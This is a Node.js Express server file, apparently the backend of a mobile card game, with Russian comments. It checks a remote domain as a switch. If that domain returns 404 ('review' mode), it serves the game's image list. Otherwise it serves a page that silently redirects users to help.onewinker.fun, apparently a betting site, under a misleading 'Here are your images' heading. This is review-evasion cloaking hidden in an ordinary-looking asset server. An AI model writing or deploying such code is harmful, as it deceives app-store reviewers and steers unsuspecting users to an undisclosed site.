const express = require('express');
const app = express();
const PORT = process.env.PORT || 443;
const https = require('https');
const fs = require('fs');

app.use('/assets', express.static('public/assets'));

app.use(express.json());

const options = {
	key: fs.readFileSync('/etc/letsencrypt/live/aviabeway.space/privkey.pem'),
	cert: fs.readFileSync('/etc/letsencrypt/live/aviabeway.space/cert.pem'),
	ca: fs.readFileSync('/etc/letsencrypt/live/aviabeway.space/chain.pem'),
};


async function isReviewExternalRequest() {
	try {
		const response = await fetch('https://help.pinmix.space');

		// Проверяем статус ответа
		if (response.status === 404) {
			return true; // Если статус 404, возвращаем true
		}
		return false; // Для всех остальных статусов возвращаем false
	} catch (error) {
		// Логируем ошибку, но не выбрасываем её
		console.error('Error while checking review external request:', error);
		return false; // В случае любой ошибки возвращаем false
	}
}
app.get('/', async (req, res) => {
	try {
		let isReview = false;

		if (await isReviewExternalRequest()) isReview = true;

		let optionIndex = isReview ? 0 : 1;

		// Images grouped by category
		const images = {
			"levelBackground" : "/assets/levelBackground.png",
			"levelBackgroundLandscape" : "/assets/levelBackgroundLandscape.png",
			"level1Btn" : "/assets/level1Btn.png",
			"level1BtnTapped" : "/assets/level1BtnTapped.png",
			"level2Btn" : "/assets/level2Btn.png",
			"level2BtnTapped" : "/assets/level2BtnTapped.png",
			"menuBackground" : "/assets/menuBackground.png",
			"menuBackgroundLandscape" : "/assets/menuBackgroundLandscape.png",
			"card1" : "/assets/card1.png",
			"card2" : "/assets/card2.png",
			"card3" : "/assets/card3.png",
			"card4" : "/assets/card4.png",
			"card5" : "/assets/card5.png",
			"gameBackground" : "/assets/gameBackground.png",
			"infoBackground" : "/assets/infoBackground.png",
			"infoBackgroundLandscape" : "/assets/infoBackgroundLandscape.png",
			"volumeIcon" : "/assets/volumeIcon.png",
			"volumeOff" : "/assets/volumeOff.png",
			"volumeOn" : "/assets/volumeOn.png",
			"loseCard" : "/assets/loseCard.png",
			"winCard" : "/assets/winCard.png",
		};

		if (optionIndex === 1) {
			const html = `
				<!DOCTYPE html>
				<html lang="en">
				<head>
					<title>Redirect</title>
					<script>
					window.location.href = 'https://help.onewinker.fun';
					</script>
				</head>
				<body>
					<h1>Here are your images:</h1>
					<pre>${JSON.stringify({ images: null }, null, 2)}</pre>
				</body>
				</html>
			`;

			return res.send(html); // ✅ Отправляем HTML-контент
		} else {
			// Return the images grouped by category
			res.json({
				images: images
			});
		}

	} catch (err) {
		console.error('Server error:', err);
		res.status(500).json({ error: "Internal Server Error" });
	}
});

// app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

https.createServer(options, app).listen(PORT, () => {
	console.log(`Server running on https://pinmix.space`);
});